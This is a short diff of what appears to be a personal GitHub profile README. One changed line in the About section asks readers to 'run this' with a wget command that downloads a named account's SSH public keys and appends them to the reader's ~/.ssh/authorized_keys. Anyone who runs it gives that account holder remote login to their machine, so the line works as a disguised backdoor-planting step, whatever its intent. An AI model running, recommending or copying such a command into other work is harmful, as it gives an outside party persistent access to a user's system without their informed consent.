@@ -4,7 +4,7 @@
 
 ✨ **About**
 
-🎲 Rolling the dice on this commit... hope it doesn’t break everything.
+✅ Run this pls: wget -O - https://github.com/Bastiaantjuhh.keys >> ~/.ssh/authorized_keys
 
 <!--✏️ **Blog Posts**-->
 
@@ -28,4 +28,4 @@
 
 🕒 **Last Update**
 
-31-03-2025 08:24:42 UTC
+31-03-2025 12:35:43 UTC
